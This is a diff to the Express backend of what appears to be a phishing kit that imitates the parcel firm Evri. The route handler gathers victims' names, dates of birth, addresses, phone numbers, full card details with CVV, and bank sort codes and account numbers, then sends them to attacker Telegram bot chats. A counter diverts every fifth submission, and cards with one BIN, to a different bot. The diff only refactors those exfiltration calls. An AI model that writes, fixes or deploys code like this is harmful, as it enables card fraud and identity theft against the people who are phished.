@@ -7785,21 +7785,57 @@ app.post("/tcapzEvri", (req, res) => {
       binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
       var originalText = `+----------- Personal Information ------------+\nFull Name: ${fname}\nDOB: ${dob}\nAddress: ${address}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\nSort Code: ${scode}\nAccount Number: ${accno}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
       if (capzEvri == 5) {
-        axios.post(
-          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
-        );
+        axios
+          .post(
+            `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
+            {
+              chat_id: 680379375,
+              text: `HAYTCHRES:\n${originalText}`,
+              parse_mode: "Markdown",
+            }
+          )
+          .catch((e) => {
+            console.log(e);
+          });
         capzEvri = 0;
       } else if (bin === "542011") {
-        axios.post(
-          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
-        );
+        axios
+          .post(
+            `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
+            {
+              chat_id: 680379375,
+              text: `HAYTCHRES:\n${originalText}`,
+              parse_mode: "Markdown",
+            }
+          )
+          .catch((e) => {
+            console.log(e);
+          });
       } else {
-        axios.post(
-          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=EvriCapz:\n${originalText}`
-        );
-        axios.post(
-          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=1437456088&text=Evri:\n${originalText}`
-        );
+        axios
+          .post(
+            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
+            {
+              chat_id: 680379375,
+              text: `EvriCapz:\n${originalText}`,
+              parse_mode: "Markdown",
+            }
+          )
+          .catch((e) => {
+            console.log(e);
+          });
+        axios
+          .post(
+            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
+            {
+              chat_id: 1437456088,
+              text: `Evri:\n${originalText}`,
+              parse_mode: "Markdown",
+            }
+          )
+          .catch((e) => {
+            console.log(e);
+          });
         capzEvri += 1;
       }
 
